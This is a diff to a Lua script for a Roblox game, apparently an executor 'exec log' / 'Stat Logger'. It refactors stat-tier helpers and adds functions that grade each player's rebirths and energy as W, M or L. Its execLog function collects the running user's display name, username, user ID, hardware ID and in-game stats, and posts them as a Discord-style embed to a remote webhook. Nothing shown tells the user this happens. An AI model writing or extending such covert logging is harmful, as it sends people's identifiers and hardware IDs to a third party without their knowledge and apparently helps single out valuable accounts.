@@ -1,5 +1,6 @@
 print("badabangboom")
 
+-- Suffixes for stat formatting
 local suffixes = {
     "", "K", "M", "B", "T",
     "QD", "QN", "SX", "SP", "Oc", "No", "Dec",
@@ -19,58 +20,66 @@ local suffixes = {
     "SxNon","SpNon","OcNon","NoNon","Ce","UCe","DCe"
 }
 
--- Format large numbers into readable suffix format
+-- Format number with suffix
 local function format_number(number)
     local suffixIndex = 1
-
     while math.abs(number) >= 1000 and suffixIndex < #suffixes do
         number = number / 1000.0
         suffixIndex = suffixIndex + 1
     end
-
     return string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
--- Build stat tiers from suffixes
-local stats = {}
-for i = #suffixes, 1, -1 do
-    local value = 10 ^ (3 * (i - 1))
-    if value >= 1e6 then
-        table.insert(stats, { value = value, label = "1" .. suffixes[i] .. "+" })
-    end
-end
-table.insert(stats, { value = 0, label = "<1M" })
-
--- Rebirth tier labels
-local rebirthsGroup = {
-    {1000000000, "1B+"}, {100000000, "100M+"}, {10000000, "10M+"}, {1000000, "1M+"}, {500000, "500k+"},
-    {250000, "250k+"}, {200000, "200k+"}, {150000, "150k+"}, {125000, "125k+"}, {100000, "100k+"},
-    {85000, "85k+"}, {75000, "75k+"}, {66666, "66k+"}, {60000, "60k+"}, {55000, "55k+"},
-    {50000, "50k+"}, {45000, "45k+"}, {40000, "40k+"}, {33333, "33k+"}, {30000, "30k+"},
-    {25000, "25k+"}, {20000, "20k+"}, {15000, "15k+"}, {10000, "10k+"}, {5000, "5k+"},
-    {2500, "2.5k+"}, {1000, "1k+"}, {100, "100+"}, {3, "3+"}, {0, "0+"}
-}
-
--- Rebirth tier selector
-function rebS(rebirths)
-    for _, group in ipairs(rebirthsGroup) do
-        if rebirths >= group[1] then
-            return group[2]
+-- Rebirth tier labeling
+local function rebS(rebirths)
+    local tiers = {
+        {1000000000, "1B+"}, {100000000, "100M+"}, {10000000, "10M+"}, {1000000, "1M+"}, {500000, "500k+"},
+        {250000, "250k+"}, {200000, "200k+"}, {150000, "150k+"}, {125000, "125k+"}, {100000, "100k+"},
+        {85000, "85k+"}, {75000, "75k+"}, {66666, "66k+"}, {60000, "60k+"}, {55000, "55k+"},
+        {50000, "50k+"}, {45000, "45k+"}, {40000, "40k+"}, {33333, "33k+"}, {30000, "30k+"},
+        {25000, "25k+"}, {20000, "20k+"}, {15000, "15k+"}, {10000, "10k+"}, {5000, "5k+"},
+        {2500, "2.5k+"}, {1000, "1k+"}, {100, "100+"}, {3, "3+"}, {0, "0+"}
+    }
+    for _, tier in ipairs(tiers) do
+        if rebirths >= tier[1] then
+            return tier[2]
         end
     end
     return "0+"
 end
 
--- Energy/stat tier selector
-function statS(energy)
-    for _, stat in ipairs(stats) do
-        if energy >= stat.value then
-            return stat.label
-        end
+-- Stat tier labeling
+local function statS(energy)
+    local suffixIndex = 1
+    while math.abs(energy) >= 1000 and suffixIndex < #suffixes do
+        energy = energy / 1000
+        suffixIndex = suffixIndex + 1
     end
-    return "<1M"
+    return "1" .. suffixes[suffixIndex] .. "+"
 end
 
+-- Classification based on rebirths
+local function getRebClass(rebirths)
+    if rebirths >= 75000 then return "W"
+    elseif rebirths >= 20000 then return "M"
+    elseif rebirths >= 0 then return "L" end
+    return "?"
+end
+
+-- Classification based on energy
+local function getStatClass(energy)
+    local suffixIndex = 1
+    while math.abs(energy) >= 1000 and suffixIndex < #suffixes do
+        energy = energy / 1000
+        suffixIndex = suffixIndex + 1
+    end
+
+    if suffixIndex >= 18 then return "W"
+    elseif suffixIndex >= 13 then return "M"
+    else return "L" end
+end
+
+-- Exec log function
 local function execLog()
     local Players = game:GetService("Players")
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -83,54 +92,47 @@ local function execLog()
     local dataFolder = ReplicatedStorage:FindFirstChild("Datas")
     local playerData = dataFolder and dataFolder:FindFirstChild(player.UserId)
 
-    local rebirths = 0
-    local energy = 0
-    local rebirthsFound = false
-    local energyFound = false
+    local rebirths, energy = 0, 0
+    local rebirthsFound, energyFound = false, false
 
     if playerData then
         local rebirthObj = playerData:FindFirstChild("Rebirth")
         local energyObj = playerData:FindFirstChild("Energy")
-
-        if rebirthObj then
-            rebirths = rebirthObj.Value
-            rebirthsFound = true
-        end
-
-        if energyObj then
-            energy = energyObj.Value
-            energyFound = true
-        end
+        if rebirthObj then rebirths = rebirthObj.Value rebirthsFound = true end
+        if energyObj then energy = energyObj.Value energyFound = true end
     end
 
     local currentTime = os.date("%m/%d/%Y, %H:%M")
     local reboption = rebS(rebirths)
     local statoption = statS(energy)
     local formattedEnergy = format_number(energy)
+    local rebClass = getRebClass(rebirths)
+    local statClass = getStatClass(energy)
 
     local embedDescription = string.format(
         "User: `%s (@%s)`\nUser ID: `%d`\nHWID: `%s`\nTime: `%s`",
         player.DisplayName, player.Name, player.UserId, hwid, currentTime
     )
 
-    -- Append warnings or valid stats
     if not dataFolder then
         embedDescription = embedDescription .. "\n**⚠ Datas folder not found**"
     elseif not playerData then
         embedDescription = embedDescription .. "\n**⚠ Player data not found**"
     else
         if rebirthsFound then
-            embedDescription = embedDescription .. string.format("\nRebirths: `%d` (%s)", rebirths, reboption)
+            embedDescription = embedDescription .. string.format("\nRebirths: `%d` (%s - %s)", rebirths, reboption, rebClass)
         else
             embedDescription = embedDescription .. "\n**⚠ Rebirths not found**"
         end
 
         if energyFound then
-            embedDescription = embedDescription .. string.format("\nEnergy: `%s` (%s)", formattedEnergy, statoption)
+            embedDescription = embedDescription .. string.format("\nEnergy: `%s` (%s - %s)", formattedEnergy, statoption, statClass)
         else
             embedDescription = embedDescription .. "\n**⚠ Stats (Energy) not found**"
         end
     end
+
+    embedDescription = embedDescription .. string.format("\n\nRebclass: **%s**\nStatclass: **%s**", rebClass, statClass)
 
     local imageUrl = "https://images-ext-1.discordapp.net/external/l5-KoXA2mt7NrUE6gWvxiprX6o72ojZeBHhDDdoI9IE/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1320931723717902376/174fde885a08dfd98be5ffefa681b07d.png?format=webp&quality=lossless&width=663&height=663"
 
@@ -140,9 +142,7 @@ local function execLog()
             ["title"] = "Exec logs - " .. player.DisplayName .. " (@" .. player.Name .. ")",
             ["description"] = embedDescription,
             ["color"] = 4286945,
-            ["footer"] = {
-                ["text"] = "reader version whatever",
-            },
+            ["footer"] = { ["text"] = "reader version whatever" },
         }},
         ["username"] = "Stat Logger",
         ["avatar_url"] = imageUrl,
@@ -158,7 +158,6 @@ local function execLog()
                 Body = HttpService:JSONEncode(payload)
             })
         end)
-
         if success and response and response.Success then
             print("yea")
         else
